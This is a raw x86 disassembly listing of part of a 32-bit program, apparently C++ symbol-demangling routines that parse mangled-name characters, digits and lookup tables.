  402694:	84 c9                	test   %cl,%cl
  402696:	75 28                	jne    0x4026c0
  402698:	83 43 30 03          	addl   $0x3,0x30(%ebx)
  40269c:	ba 20 00 00 00       	mov    $0x20,%edx
  4026a1:	83 c6 01             	add    $0x1,%esi
  4026a4:	c7 04 24 00 00 00 00 	movl   $0x0,(%esp)
  4026ab:	89 c1                	mov    %eax,%ecx
  4026ad:	89 73 0c             	mov    %esi,0xc(%ebx)
  4026b0:	89 d8                	mov    %ebx,%eax
  4026b2:	e8 f9 fd ff ff       	call   0x4024b0
  4026b7:	83 c4 04             	add    $0x4,%esp
  4026ba:	5b                   	pop    %ebx
  4026bb:	5e                   	pop    %esi
  4026bc:	c3                   	ret
  4026bd:	8d 76 00             	lea    0x0(%esi),%esi
  4026c0:	83 43 30 02          	addl   $0x2,0x30(%ebx)
  4026c4:	ba 1f 00 00 00       	mov    $0x1f,%edx
  4026c9:	eb d6                	jmp    0x4026a1
  4026cb:	90                   	nop
  4026cc:	8d 74 26 00          	lea    0x0(%esi,%eiz,1),%esi
  4026d0:	8b 48 0c             	mov    0xc(%eax),%ecx
  4026d3:	80 39 53             	cmpb   $0x53,(%ecx)
  4026d6:	74 08                	je     0x4026e0
  4026d8:	31 c0                	xor    %eax,%eax
  4026da:	c3                   	ret
  4026db:	90                   	nop
  4026dc:	8d 74 26 00          	lea    0x0(%esi,%eiz,1),%esi
  4026e0:	55                   	push   %ebp
  4026e1:	57                   	push   %edi
  4026e2:	56                   	push   %esi
  4026e3:	53                   	push   %ebx
  4026e4:	8d 59 01             	lea    0x1(%ecx),%ebx
  4026e7:	83 ec 0c             	sub    $0xc,%esp
  4026ea:	89 58 0c             	mov    %ebx,0xc(%eax)
  4026ed:	80 79 01 00          	cmpb   $0x0,0x1(%ecx)
  4026f1:	75 4d                	jne    0x402740
  4026f3:	31 db                	xor    %ebx,%ebx
  4026f5:	8b 48 08             	mov    0x8(%eax),%ecx
  4026f8:	c1 e9 03             	shr    $0x3,%ecx
  4026fb:	83 e1 01             	and    $0x1,%ecx
  4026fe:	85 d2                	test   %edx,%edx
  402700:	0f 95 c2             	setne  %dl
  402703:	38 d1                	cmp    %dl,%cl
  402705:	73 0f                	jae    0x402716
  402707:	8b 50 0c             	mov    0xc(%eax),%edx
  40270a:	0f b6 12             	movzbl (%edx),%edx
  40270d:	83 ea 43             	sub    $0x43,%edx
  402710:	80 fa 01             	cmp    $0x1,%dl
  402713:	0f 96 c1             	setbe  %cl
  402716:	0f b6 c9             	movzbl %cl,%ecx
  402719:	ba 00 85 42 00       	mov    $0x428500,%edx
  40271e:	66 90                	xchg   %ax,%ax
  402720:	3a 1a                	cmp    (%edx),%bl
  402722:	0f 84 bc 00 00 00    	je     0x4027e4
  402728:	83 c2 1c             	add    $0x1c,%edx
  40272b:	81 fa c4 85 42 00    	cmp    $0x4285c4,%edx
  402731:	75 ed                	jne    0x402720
  402733:	31 c0                	xor    %eax,%eax
  402735:	83 c4 0c             	add    $0xc,%esp
  402738:	5b                   	pop    %ebx
  402739:	5e                   	pop    %esi
  40273a:	5f                   	pop    %edi
  40273b:	5d                   	pop    %ebp
  40273c:	c3                   	ret
  40273d:	8d 76 00             	lea    0x0(%esi),%esi
  402740:	8d 59 02             	lea    0x2(%ecx),%ebx
  402743:	89 58 0c             	mov    %ebx,0xc(%eax)
  402746:	0f be 59 01          	movsbl 0x1(%ecx),%ebx
  40274a:	8d 4b d0             	lea    -0x30(%ebx),%ecx
  40274d:	80 f9 09             	cmp    $0x9,%cl
  402750:	76 09                	jbe    0x40275b
  402752:	80 fb 5f             	cmp    $0x5f,%bl
  402755:	0f 85 2f 01 00 00    	jne    0x40288a
  40275b:	80 fb 5f             	cmp    $0x5f,%bl
  40275e:	0f 84 7c 00 00 00    	je     0x4027e0
  402764:	8d 4b d0             	lea    -0x30(%ebx),%ecx
  402767:	31 d2                	xor    %edx,%edx
  402769:	80 f9 09             	cmp    $0x9,%cl
  40276c:	77 2d                	ja     0x40279b
  40276e:	66 90                	xchg   %ax,%ax
  402770:	8d 0c d2             	lea    (%edx,%edx,8),%ecx
  402773:	8d 4c 8b d0          	lea    -0x30(%ebx,%ecx,4),%ecx
  402777:	39 ca                	cmp    %ecx,%edx
  402779:	77 b8                	ja     0x402733
  40277b:	8b 50 0c             	mov    0xc(%eax),%edx
  40277e:	80 3a 00             	cmpb   $0x0,(%edx)
  402781:	74 2d                	je     0x4027b0
  402783:	8d 5a 01             	lea    0x1(%edx),%ebx
  402786:	89 58 0c             	mov    %ebx,0xc(%eax)
  402789:	0f be 1a             	movsbl (%edx),%ebx
  40278c:	80 fb 5f             	cmp    $0x5f,%bl
  40278f:	74 2f                	je     0x4027c0
  402791:	89 ca                	mov    %ecx,%edx
  402793:	8d 4b d0             	lea    -0x30(%ebx),%ecx
  402796:	80 f9 09             	cmp    $0x9,%cl
  402799:	76 d5                	jbe    0x402770
  40279b:	8d 4b bf             	lea    -0x41(%ebx),%ecx
  40279e:	80 f9 19             	cmp    $0x19,%cl
  4027a1:	77 90                	ja     0x402733
  4027a3:	8d 0c d2             	lea    (%edx,%edx,8),%ecx
  4027a6:	8d 4c 8b c9          	lea    -0x37(%ebx,%ecx,4),%ecx
  4027aa:	eb cb                	jmp    0x402777
  4027ac:	8d 74 26 00          	lea    0x0(%esi,%eiz,1),%esi
  4027b0:	31 db                	xor    %ebx,%ebx
  4027b2:	89 ca                	mov    %ecx,%edx
  4027b4:	eb dd                	jmp    0x402793
  4027b6:	8d 76 00             	lea    0x0(%esi),%esi
  4027b9:	8d bc 27 00 00 00 00 	lea    0x0(%edi,%eiz,1),%edi
  4027c0:	83 c1 01             	add    $0x1,%ecx
  4027c3:	3b 48 20             	cmp    0x20(%eax),%ecx
  4027c6:	0f 83 67 ff ff ff    	jae    0x402733
  4027cc:	83 40 28 01          	addl   $0x1,0x28(%eax)
  4027d0:	8b 40 1c             	mov    0x1c(%eax),%eax
  4027d3:	8b 04 88             	mov    (%eax,%ecx,4),%eax
  4027d6:	83 c4 0c             	add    $0xc,%esp
  4027d9:	5b                   	pop    %ebx
  4027da:	5e                   	pop    %esi
  4027db:	5f                   	pop    %edi
  4027dc:	5d                   	pop    %ebp
  4027dd:	c3                   	ret
  4027de:	66 90                	xchg   %ax,%ax
  4027e0:	31 c9                	xor    %ecx,%ecx
  4027e2:	eb df                	jmp    0x4027c3
  4027e4:	8b 72 14             	mov    0x14(%edx),%esi
  4027e7:	85 f6                	test   %esi,%esi
  4027e9:	89 74 24 04          	mov    %esi,0x4(%esp)
  4027ed:	0f 84 87 00 00 00    	je     0x40287a
  4027f3:	8b 58 14             	mov    0x14(%eax),%ebx
  4027f6:	8b 68 18             	mov    0x18(%eax),%ebp
  4027f9:	8b 7a 18             	mov    0x18(%edx),%edi
  4027fc:	c7 04 24 00 00 00 00 	movl   $0x0,(%esp)
  402803:	39 eb                	cmp    %ebp,%ebx
  402805:	89 7c 24 08          	mov    %edi,0x8(%esp)
  402809:	7d 2a                	jge    0x402835
  40280b:	8b 70 10             	mov    0x10(%eax),%esi
  40280e:	8d 3c 5b             	lea    (%ebx,%ebx,2),%edi
  402811:	83 c3 01             	add    $0x1,%ebx
  402814:	89 58 14             	mov    %ebx,0x14(%eax)
  402817:	8d 3c be             	lea    (%esi,%edi,4),%edi
  40281a:	85 ff                	test   %edi,%edi
  40281c:	74 17                	je     0x402835
  40281e:	8b 74 24 04          	mov    0x4(%esp),%esi
  402822:	c7 07 18 00 00 00    	movl   $0x18,(%edi)
  402828:	89 3c 24             	mov    %edi,(%esp)
  40282b:	89 77 04             	mov    %esi,0x4(%edi)
  40282e:	8b 74 24 08          	mov    0x8(%esp),%esi
  402832:	89 77 08             	mov    %esi,0x8(%edi)
  402835:	8b 34 24             	mov    (%esp),%esi
  402838:	89 70 2c             	mov    %esi,0x2c(%eax)
  40283b:	85 c9                	test   %ecx,%ecx
  40283d:	74 43                	je     0x402882
  40283f:	8b 4a 0c             	mov    0xc(%edx),%ecx
  402842:	8b 72 10             	mov    0x10(%edx),%esi
  402845:	01 70 30             	add    %esi,0x30(%eax)
  402848:	39 dd                	cmp    %ebx,%ebp
  40284a:	0f 8e e3 fe ff ff    	jle    0x402733
  402850:	8b 50 10             	mov    0x10(%eax),%edx
  402853:	8d 3c 5b             	lea    (%ebx,%ebx,2),%edi
  402856:	83 c3 01             	add    $0x1,%ebx
  402859:	89 58 14             	mov    %ebx,0x14(%eax)
  40285c:	8d 14 ba             	lea    (%edx,%edi,4),%edx
  40285f:	85 d2                	test   %edx,%edx
  402861:	0f 84 cc fe ff ff    	je     0x402733
  402867:	c7 02 18 00 00 00    	movl   $0x18,(%edx)
  40286d:	89 4a 04             	mov    %ecx,0x4(%edx)
  402870:	89 d0                	mov    %edx,%eax
  402872:	89 72 08             	mov    %esi,0x8(%edx)
  402875:	e9 bb fe ff ff       	jmp    0x402735
  40287a:	8b 68 18             	mov    0x18(%eax),%ebp
  40287d:	8b 58 14             	mov    0x14(%eax),%ebx
  402880:	eb b9                	jmp    0x40283b
  402882:	8b 4a 04             	mov    0x4(%edx),%ecx
  402885:	8b 72 08             	mov    0x8(%edx),%esi
  402888:	eb bb                	jmp    0x402845
  40288a:	8d 4b bf             	lea    -0x41(%ebx),%ecx
  40288d:	80 f9 19             	cmp    $0x19,%cl
  402890:	0f 86 ce fe ff ff    	jbe    0x402764
  402896:	e9 5a fe ff ff       	jmp    0x4026f5
  40289b:	90                   	nop
  40289c:	8d 74 26 00          	lea    0x0(%esi,%eiz,1),%esi
  4028a0:	85 c9                	test   %ecx,%ecx
  4028a2:	57                   	push   %edi
  4028a3:	89 d7                	mov    %edx,%edi
  4028a5:	56                   	push   %esi
  4028a6:	89 c6                	mov    %eax,%esi
  4028a8:	53                   	push   %ebx
  4028a9:	89 cb                	mov    %ecx,%ebx
  4028ab:	74 1a                	je     0x4028c7
  4028ad:	8d 76 00             	lea    0x0(%esi),%esi
  4028b0:	83 3b 4b             	cmpl   $0x4b,(%ebx)
  4028b3:	77 12                	ja     0x4028c7
  4028b5:	8b 0b                	mov    (%ebx),%ecx
  4028b7:	ff 24 8d b0 77 42 00 	jmp    *0x4277b0(,%ecx,4)
  4028be:	66 90                	xchg   %ax,%ax
  4028c0:	8b 5b 08             	mov    0x8(%ebx),%ebx
  4028c3:	85 db                	test   %ebx,%ebx
  4028c5:	75 e9                	jne    0x4028b0
  4028c7:	5b                   	pop    %ebx
  4028c8:	5e                   	pop    %esi
  4028c9:	5f                   	pop    %edi
  4028ca:	c3                   	ret
  4028cb:	90                   	nop
  4028cc:	8d 74 26 00          	lea    0x0(%esi,%eiz,1),%esi
  4028d0:	8b 5b 04             	mov    0x4(%ebx),%ebx
  4028d3:	eb ee                	jmp    0x4028c3
  4028d5:	8b 4b 04             	mov    0x4(%ebx),%ecx
  4028d8:	83 39 05             	cmpl   $0x5,(%ecx)
  4028db:	75 06                	jne    0x4028e3
  4028dd:	83 07 01             	addl   $0x1,(%edi)
  4028e0:	8b 4b 04             	mov    0x4(%ebx),%ecx
  4028e3:	89 fa                	mov    %edi,%edx
  4028e5:	89 f0                	mov    %esi,%eax
  4028e7:	e8 b4 ff ff ff       	call   0x4028a0
  4028ec:	8b 5b 08             	mov    0x8(%ebx),%ebx
  4028ef:	eb d2                	jmp    0x4028c3
  4028f1:	83 06 01             	addl   $0x1,(%esi)
  4028f4:	8b 4b 04             	mov    0x4(%ebx),%ecx
  4028f7:	eb ea                	jmp    0x4028e3
  4028f9:	8d b4 26 00 00 00 00 	lea    0x0(%esi,%eiz,1),%esi
  402900:	53                   	push   %ebx
  402901:	83 ec 28             	sub    $0x28,%esp
  402904:	8b 88 00 01 00 00    	mov    0x100(%eax),%ecx
  40290a:	81 f9 ff 00 00 00    	cmp    $0xff,%ecx
  402910:	74 1e                	je     0x402930
  402912:	8d 59 01             	lea    0x1(%ecx),%ebx
  402915:	89 98 00 01 00 00    	mov    %ebx,0x100(%eax)
  40291b:	88 14 08             	mov    %dl,(%eax,%ecx,1)
  40291e:	88 90 04 01 00 00    	mov    %dl,0x104(%eax)
  402924:	83 c4 28             	add    $0x28,%esp
  402927:	5b                   	pop    %ebx
  402928:	c3                   	ret
  402929:	8d b4 26 00 00 00 00 	lea    0x0(%esi,%eiz,1),%esi
  402930:	8b 88 0c 01 00 00    	mov    0x10c(%eax),%ecx
  402936:	c6 80 ff 00 00 00 00 	movb   $0x0,0xff(%eax)
  40293d:	bb 01 00 00 00       	mov    $0x1,%ebx
  402942:	89 54 24 1c          	mov    %edx,0x1c(%esp)
  402946:	89 04 24             	mov    %eax,(%esp)
  402949:	89 44 24 18          	mov    %eax,0x18(%esp)
  40294d:	c7 44 24 04 ff 00 00 	movl   $0xff,0x4(%esp)
  402954:	00 
  402955:	89 4c 24 08          	mov    %ecx,0x8(%esp)
  402959:	ff 90 08 01 00 00    	call   *0x108(%eax)
  40295f:	8b 44 24 18          	mov    0x18(%esp),%eax
  402963:	31 c9                	xor    %ecx,%ecx
  402965:	8b 54 24 1c          	mov    0x1c(%esp),%edx
  402969:	83 80 20 01 00 00 01 	addl   $0x1,0x120(%eax)
  402970:	eb a3                	jmp    0x402915
  402972:	8d b4 26 00 00 00 00 	lea    0x0(%esi,%eiz,1),%esi
  402979:	8d bc 27 00 00 00 00 	lea    0x0(%edi,%eiz,1),%edi
  402980:	55                   	push   %ebp
  402981:	57                   	push   %edi
  402982:	31 ed                	xor    %ebp,%ebp
  402984:	56                   	push   %esi
  402985:	89 c6                	mov    %eax,%esi
  402987:	53                   	push   %ebx
  402988:	8b 00                	mov    (%eax),%eax
  40298a:	31 ff                	xor    %edi,%edi
  40298c:	0f be 10             	movsbl (%eax),%edx
  40298f:	80 fa 6e             	cmp    $0x6e,%dl
  402992:	74 31                	je     0x4029c5
  402994:	8d 42 d0             	lea    -0x30(%edx),%eax
  402997:	31 db                	xor    %ebx,%ebx
  402999:	3c 09                	cmp    $0x9,%al
  40299b:	77 1e                	ja     0x4029bb
  40299d:	8b 06                	mov    (%esi),%eax
  40299f:	31 db                	xor    %ebx,%ebx
  4029a1:	8d 48 01             	lea    0x1(%eax),%ecx
  4029a4:	8d 04 9b             	lea    (%ebx,%ebx,4),%eax
  4029a7:	89 0e                	mov    %ecx,(%esi)
  4029a9:	83 c1 01             	add    $0x1,%ecx
  4029ac:	8d 5c 42 d0          	lea    -0x30(%edx,%eax,2),%ebx
  4029b0:	0f be 51 ff          	movsbl -0x1(%ecx),%edx
  4029b4:	8d 42 d0             	lea    -0x30(%edx),%eax
  4029b7:	3c 09                	cmp    $0x9,%al
  4029b9:	76 e9                	jbe    0x4029a4
  4029bb:	31 eb                	xor    %ebp,%ebx
  4029bd:	8d 04 3b             	lea    (%ebx,%edi,1),%eax
  4029c0:	5b                   	pop    %ebx
  4029c1:	5e                   	pop    %esi
  4029c2:	5f                   	pop    %edi
  4029c3:	5d                   	pop    %ebp
  4029c4:	c3                   	ret
  4029c5:	8d 50 01             	lea    0x1(%eax),%edx
  4029c8:	66 bf 01 00          	mov    $0x1,%di
  4029cc:	bd ff ff ff ff       	mov    $0xffffffff,%ebp
  4029d1:	89 16                	mov    %edx,(%esi)
  4029d3:	0f be 50 01          	movsbl 0x1(%eax),%edx
  4029d7:	eb bb                	jmp    0x402994
  4029d9:	8d b4 26 00 00 00 00 	lea    0x0(%esi,%eiz,1),%esi
  4029e0:	8b 50 14             	mov    0x14(%eax),%edx
  4029e3:	3b 50 18             	cmp    0x18(%eax),%edx
  4029e6:	7d 2d                	jge    0x402a15
  4029e8:	53                   	push   %ebx
  4029e9:	8b 48 10             	mov    0x10(%eax),%ecx
  4029ec:	8d 1c 52             	lea    (%edx,%edx,2),%ebx
  4029ef:	83 c2 01             	add    $0x1,%edx
  4029f2:	89 50 14             	mov    %edx,0x14(%eax)
  4029f5:	8d 1c 99             	lea    (%ecx,%ebx,4),%ebx
  4029f8:	85 db                	test   %ebx,%ebx
  4029fa:	74 15                	je     0x402a11
  4029fc:	c7 03 40 00 00 00    	movl   $0x40,(%ebx)
  402a02:	83 c0 0c             	add    $0xc,%eax
  402a05:	e8 76 ff ff ff       	call   0x402980
  402a0a:	89 43 04             	mov    %eax,0x4(%ebx)
  402a0d:	89 d8                	mov    %ebx,%eax
  402a0f:	5b                   	pop    %ebx
  402a10:	c3                   	ret
  402a11:	31 c0                	xor    %eax,%eax
  402a13:	5b                   	pop    %ebx
  402a14:	c3                   	ret
  402a15:	31 c0                	xor    %eax,%eax
  402a17:	c3                   	ret
  402a18:	90                   	nop
  402a19:	8d b4 26 00 00 00 00 	lea    0x0(%esi,%eiz,1),%esi
  402a20:	53                   	push   %ebx
  402a21:	8b 50 0c             	mov    0xc(%eax),%edx
  402a24:	89 c3                	mov    %eax,%ebx
  402a26:	0f b6 02             	movzbl (%edx),%eax
  402a29:	3c 5f                	cmp    $0x5f,%al
  402a2b:	74 23                	je     0x402a50
  402a2d:	3c 6e                	cmp    $0x6e,%al
  402a2f:	74 10                	je     0x402a41
  402a31:	8d 43 0c             	lea    0xc(%ebx),%eax
  402a34:	e8 47 ff ff ff       	call   0x402980
  402a39:	8b 53 0c             	mov    0xc(%ebx),%edx
  402a3c:	80 3a 5f             	cmpb   $0x5f,(%edx)
  402a3f:	74 19                	je     0x402a5a
  402a41:	b8 ff ff ff ff       	mov    $0xffffffff,%eax
  402a46:	5b                   	pop    %ebx
  402a47:	c3                   	ret
  402a48:	90                   	nop
  402a49:	8d b4 26 00 00 00 00 	lea    0x0(%esi,%eiz,1),%esi
  402a50:	31 c0                	xor    %eax,%eax
  402a52:	83 c2 01             	add    $0x1,%edx
  402a55:	89 53 0c             	mov    %edx,0xc(%ebx)
  402a58:	5b                   	pop    %ebx
  402a59:	c3                   	ret
  402a5a:	83 c0 01             	add    $0x1,%eax
  402a5d:	eb f3                	jmp    0x402a52
  402a5f:	90                   	nop
  402a60:	8b 50 0c             	mov    0xc(%eax),%edx
  402a63:	80 3a 54             	cmpb   $0x54,(%edx)
  402a66:	74 08                	je     0x402a70
  402a68:	31 c0                	xor    %eax,%eax
  402a6a:	c3                   	ret
  402a6b:	90                   	nop
  402a6c:	8d 74 26 00          	lea    0x0(%esi,%eiz,1),%esi
  402a70:	56                   	push   %esi
  402a71:	83 c2 01             	add    $0x1,%edx
  402a74:	53                   	push   %ebx
  402a75:	89 50 0c             	mov    %edx,0xc(%eax)
  402a78:	89 c3                	mov    %eax,%ebx
  402a7a:	e8 a1 ff ff ff       	call   0x402a20
  402a7f:	85 c0                	test   %eax,%eax
  402a81:	78 2d                	js     0x402ab0
  402a83:	83 43 28 01          	addl   $0x1,0x28(%ebx)
  402a87:	8b 4b 14             	mov    0x14(%ebx),%ecx
  402a8a:	3b 4b 18             	cmp    0x18(%ebx),%ecx
  402a8d:	7d 21                	jge    0x402ab0
  402a8f:	8b 53 10             	mov    0x10(%ebx),%edx
  402a92:	8d 34 49             	lea    (%ecx,%ecx,2),%esi
  402a95:	83 c1 01             	add    $0x1,%ecx
  402a98:	89 4b 14             	mov    %ecx,0x14(%ebx)
  402a9b:	8d 14 b2             	lea    (%edx,%esi,4),%edx
  402a9e:	85 d2                	test   %edx,%edx
  402aa0:	74 0e                	je     0x402ab0
  402aa2:	89 42 04             	mov    %eax,0x4(%edx)
  402aa5:	c7 02 05 00 00 00    	movl   $0x5,(%edx)
  402aab:	89 d0                	mov    %edx,%eax
  402aad:	5b                   	pop    %ebx
  402aae:	5e                   	pop    %esi
  402aaf:	c3                   	ret
  402ab0:	31 c0                	xor    %eax,%eax
  402ab2:	5b                   	pop    %ebx
  402ab3:	5e                   	pop    %esi
  402ab4:	c3                   	ret
  402ab5:	8d 74 26 00          	lea    0x0(%esi,%eiz,1),%esi
  402ab9:	8d bc 27 00 00 00 00 	lea    0x0(%edi,%eiz,1),%edi
  402ac0:	8b 50 0c             	mov    0xc(%eax),%edx
  402ac3:	80 3a 5f             	cmpb   $0x5f,(%edx)
  402ac6:	74 08                	je     0x402ad0
  402ac8:	b8 01 00 00 00       	mov    $0x1,%eax
  402acd:	c3                   	ret
  402ace:	66 90                	xchg   %ax,%ax
  402ad0:	83 c2 01             	add    $0x1,%edx
  402ad3:	83 c0 0c             	add    $0xc,%eax
  402ad6:	89 10                	mov    %edx,(%eax)
  402ad8:	e8 a3 fe ff ff       	call   0x402980
  402add:	f7 d0                	not    %eax
  402adf:	c1 e8 1f             	shr    $0x1f,%eax
  402ae2:	c3                   	ret
  402ae3:	8d b6 00 00 00 00    	lea    0x0(%esi),%esi
  402ae9:	8d bc 27 00 00 00 00 	lea    0x0(%edi,%eiz,1),%edi
  402af0:	57                   	push   %edi
  402af1:	56                   	push   %esi
  402af2:	53                   	push   %ebx
  402af3:	89 c3                	mov    %eax,%ebx
  402af5:	8d 40 0c             	lea    0xc(%eax),%eax
  402af8:	83 ec 10             	sub    $0x10,%esp
  402afb:	e8 80 fe ff ff       	call   0x402980
  402b00:	85 c0                	test   %eax,%eax
  402b02:	89 c6                	mov    %eax,%esi
  402b04:	0f 8e a6 00 00 00    	jle    0x402bb0
  402b0a:	8b 7b 0c             	mov    0xc(%ebx),%edi
  402b0d:	8b 43 04             	mov    0x4(%ebx),%eax
  402b10:	29 f8                	sub    %edi,%eax
  402b12:	39 c6                	cmp    %eax,%esi
  402b14:	0f 8f 9a 00 00 00    	jg     0x402bb4
  402b1a:	f6 43 08 04          	testb  $0x4,0x8(%ebx)
  402b1e:	8d 04 37             	lea    (%edi,%esi,1),%eax
  402b21:	89 43 0c             	mov    %eax,0xc(%ebx)
  402b24:	75 3a                	jne    0x402b60
  402b26:	83 fe 09             	cmp    $0x9,%esi
  402b29:	7e 1c                	jle    0x402b47
  402b2b:	c7 44 24 08 08 00 00 	movl   $0x8,0x8(%esp)
  402b32:	00 
  402b33:	c7 44 24 04 e0 78 42 	movl   $0x4278e0,0x4(%esp)
  402b3a:	00 
  402b3b:	89 3c 24             	mov    %edi,(%esp)
  402b3e:	e8 85 d3 00 00       	call   0x40fec8
  402b43:	85 c0                	test   %eax,%eax
  402b45:	74 29                	je     0x402b70
  402b47:	89 f1                	mov    %esi,%ecx
  402b49:	89 fa                	mov    %edi,%edx
  402b4b:	89 d8                	mov    %ebx,%eax
  402b4d:	e8 ce f9 ff ff       	call   0x402520
  402b52:	89 43 2c             	mov    %eax,0x2c(%ebx)
  402b55:	83 c4 10             	add    $0x10,%esp
  402b58:	5b                   	pop    %ebx
  402b59:	5e                   	pop    %esi
  402b5a:	5f                   	pop    %edi
  402b5b:	c3                   	ret
  402b5c:	8d 74 26 00          	lea    0x0(%esi,%eiz,1),%esi
  402b60:	80 38 24             	cmpb   $0x24,(%eax)
  402b63:	75 c1                	jne    0x402b26
  402b65:	83 c0 01             	add    $0x1,%eax
  402b68:	89 43 0c             	mov    %eax,0xc(%ebx)
  402b6b:	eb b9                	jmp    0x402b26
  402b6d:	8d 76 00             	lea    0x0(%esi),%esi
  402b70:	0f b6 47 08          	movzbl 0x8(%edi),%eax
  402b74:	3c 5f                	cmp    $0x5f,%al
  402b76:	0f 94 c1             	sete   %cl
  402b79:	3c 2e                	cmp    $0x2e,%al
  402b7b:	0f 94 c2             	sete   %dl
  402b7e:	08 d1                	or     %dl,%cl
  402b80:	75 04                	jne    0x402b86
  402b82:	3c 24                	cmp    $0x24,%al
  402b84:	75 c1                	jne    0x402b47
  402b86:	80 7f 09 4e          	cmpb   $0x4e,0x9(%edi)
  402b8a:	75 bb                	jne    0x402b47
  402b8c:	8b 43 30             	mov    0x30(%ebx),%eax
  402b8f:	b9 15 00 00 00       	mov    $0x15,%ecx
  402b94:	ba e9 78 42 00       	mov    $0x4278e9,%edx
  402b99:	83 c0 16             	add    $0x16,%eax
  402b9c:	29 f0                	sub    %esi,%eax
  402b9e:	89 43 30             	mov    %eax,0x30(%ebx)
  402ba1:	89 d8                	mov    %ebx,%eax
  402ba3:	e8 78 f9 ff ff       	call   0x402520
  402ba8:	eb a8                	jmp    0x402b52
  402baa:	8d b6 00 00 00 00    	lea    0x0(%esi),%esi
  402bb0:	31 c0                	xor    %eax,%eax
  402bb2:	eb a1                	jmp    0x402b55
  402bb4:	31 c0                	xor    %eax,%eax
  402bb6:	eb 9a                	jmp    0x402b52
  402bb8:	90                   	nop
  402bb9:	8d b4 26 00 00 00 00 	lea    0x0(%esi,%eiz,1),%esi
  402bc0:	85 d2                	test   %edx,%edx
  402bc2:	56                   	push   %esi
  402bc3:	53                   	push   %ebx
  402bc4:	89 c3                	mov    %eax,%ebx
  402bc6:	75 16                	jne    0x402bde
  402bc8:	8b 40 0c             	mov    0xc(%eax),%eax
  402bcb:	80 38 00             	cmpb   $0x0,(%eax)
  402bce:	75 05                	jne    0x402bd5
  402bd0:	31 c0                	xor    %eax,%eax
  402bd2:	5b                   	pop    %ebx
  402bd3:	5e                   	pop    %esi
  402bd4:	c3                   	ret
  402bd5:	8d 50 01             	lea    0x1(%eax),%edx
  402bd8:	89 53 0c             	mov    %edx,0xc(%ebx)
  402bdb:	0f be 10             	movsbl (%eax),%edx
  402bde:	83 fa 68             	cmp    $0x68,%edx
  402be1:	74 2d                	je     0x402c10
  402be3:	83 fa 76             	cmp    $0x76,%edx
  402be6:	75 e8                	jne    0x402bd0
  402be8:	8d 73 0c             	lea    0xc(%ebx),%esi
  402beb:	89 f0                	mov    %esi,%eax
  402bed:	e8 8e fd ff ff       	call   0x402980
  402bf2:	8b 53 0c             	mov    0xc(%ebx),%edx
  402bf5:	80 3a 5f             	cmpb   $0x5f,(%edx)
  402bf8:	75 d6                	jne    0x402bd0
  402bfa:	83 c2 01             	add    $0x1,%edx
  402bfd:	89 f0                	mov    %esi,%eax
  402bff:	89 53 0c             	mov    %edx,0xc(%ebx)
  402c02:	e8 79 fd ff ff       	call   0x402980
  402c07:	eb 0f                	jmp    0x402c18
  402c09:	8d b4 26 00 00 00 00 	lea    0x0(%esi,%eiz,1),%esi
  402c10:	8d 43 0c             	lea    0xc(%ebx),%eax
  402c13:	e8 68 fd ff ff       	call   0x402980
  402c18:	8b 43 0c             	mov    0xc(%ebx),%eax
  402c1b:	80 38 5f             	cmpb   $0x5f,(%eax)
  402c1e:	75 b0                	jne    0x402bd0
  402c20:	83 c0 01             	add    $0x1,%eax
  402c23:	89 43 0c             	mov    %eax,0xc(%ebx)
  402c26:	b8 01 00 00 00       	mov    $0x1,%eax
  402c2b:	eb a5                	jmp    0x402bd2
  402c2d:	8d 76 00             	lea    0x0(%esi),%esi
  402c30:	8b 88 10 01 00 00    	mov    0x110(%eax),%ecx
  402c36:	85 c9                	test   %ecx,%ecx
  402c38:	74 3d                	je     0x402c77
  402c3a:	8b 41 04             	mov    0x4(%ecx),%eax
  402c3d:	8b 12                	mov    (%edx),%edx
  402c3f:	8b 40 08             	mov    0x8(%eax),%eax
  402c42:	85 c0                	test   %eax,%eax
  402c44:	74 2a                	je     0x402c70
  402c46:	83 38 2f             	cmpl   $0x2f,(%eax)
  402c49:	75 25                	jne    0x402c70
  402c4b:	83 fa 00             	cmp    $0x0,%edx
  402c4e:	7f 0b                	jg     0x402c5b
  402c50:	eb 15                	jmp    0x402c67
  402c52:	83 38 2f             	cmpl   $0x2f,(%eax)
  402c55:	75 19                	jne    0x402c70
  402c57:	85 d2                	test   %edx,%edx
  402c59:	74 18                	je     0x402c73
  402c5b:	8b 40 08             	mov    0x8(%eax),%eax
  402c5e:	83 ea 01             	sub    $0x1,%edx
  402c61:	85 c0                	test   %eax,%eax
  402c63:	75 ed                	jne    0x402c52
  402c65:	f3 c3                	repz ret
  402c67:	74 0a                	je     0x402c73
  402c69:	8d b4 26 00 00 00 00 	lea    0x0(%esi,%eiz,1),%esi
  402c70:	31 c0                	xor    %eax,%eax
  402c72:	c3                   	ret
  402c73:	8b 40 04             	mov    0x4(%eax),%eax
  402c76:	c3                   	ret
  402c77:	c7 80 18 01 00 00 01 	movl   $0x1,0x118(%eax)
  402c7e:	00 00 00 
  402c81:	31 c0                	xor    %eax,%eax
  402c83:	c3                   	ret
  402c84:	8d b6 00 00 00 00    	lea    0x0(%esi),%esi
  402c8a:	8d bf 00 00 00 00    	lea    0x0(%edi),%edi
  402c90:	56                   	push   %esi
  402c91:	53                   	push   %ebx
  402c92:	89 c6                	mov    %eax,%esi
  402c94:	89 d3                	mov    %edx,%ebx
  402c96:	83 ec 04             	sub    $0x4,%esp
  402c99:	85 d2                	test   %edx,%edx
  402c9b:	74 28                	je     0x402cc5
  402c9d:	83 3b 4a             	cmpl   $0x4a,(%ebx)
  402ca0:	77 0e                	ja     0x402cb0
  402ca2:	8b 13                	mov    (%ebx),%edx
  402ca4:	ff 24 95 00 79 42 00 	jmp    *0x427900(,%edx,4)
  402cab:	90                   	nop
  402cac:	8d 74 26 00          	lea    0x0(%esi,%eiz,1),%esi
  402cb0:	8b 53 04             	mov    0x4(%ebx),%edx
  402cb3:	89 f0                	mov    %esi,%eax
  402cb5:	e8 d6 ff ff ff       	call   0x402c90
  402cba:	85 c0                	test   %eax,%eax
  402cbc:	75 09                	jne    0x402cc7
  402cbe:	8b 5b 08             	mov    0x8(%ebx),%ebx
  402cc1:	85 db                	test   %ebx,%ebx
  402cc3:	75 d8                	jne    0x402c9d
  402cc5:	31 c0                	xor    %eax,%eax
  402cc7:	83 c4 04             	add    $0x4,%esp
  402cca:	5b                   	pop    %ebx
  402ccb:	5e                   	pop    %esi
  402ccc:	c3                   	ret
  402ccd:	8d 76 00             	lea    0x0(%esi),%esi
  402cd0:	8d 53 04             	lea    0x4(%ebx),%edx
  402cd3:	89 f0                	mov    %esi,%eax
  402cd5:	e8 56 ff ff ff       	call   0x402c30
  402cda:	85 c0                	test   %eax,%eax
